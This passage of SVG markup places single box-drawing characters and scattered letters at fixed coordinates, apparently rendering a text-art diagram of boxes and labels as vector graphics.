<text text-anchor='middle' x='504' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='772' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='504' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='964' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='512' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='212' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='512' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='276' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='512' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='372' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='512' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='612' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='512' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='676' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='512' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='772' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='512' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='964' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='520' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='276' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='520' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='372' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='520' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='676' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='520' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='772' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='520' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='964' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='536' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='276' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='536' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='372' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='536' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='676' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='536' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='772' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='536' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='964' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='544' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='964' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='552' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='964' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='560' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='964' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='576' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='964' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='584' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='964' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='592' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='964' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='600' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='244' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='600' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='600' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='600' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='600' y='308' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='600' y='340' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='600' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='600' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='600' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='600' y='404' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='600' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='644' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='600' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='600' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='600' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='600' y='708' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='600' y='740' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='600' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='600' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='600' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='600' y='804' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='600' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='964' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='608' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='964' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='616' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='180' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='640' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='436' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='640' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='580' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='640' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='644' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='708' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='724' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='740' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='804' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='820' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='836' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='640' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='468' fill='currentColor' style='font-size:1em'>─</text>
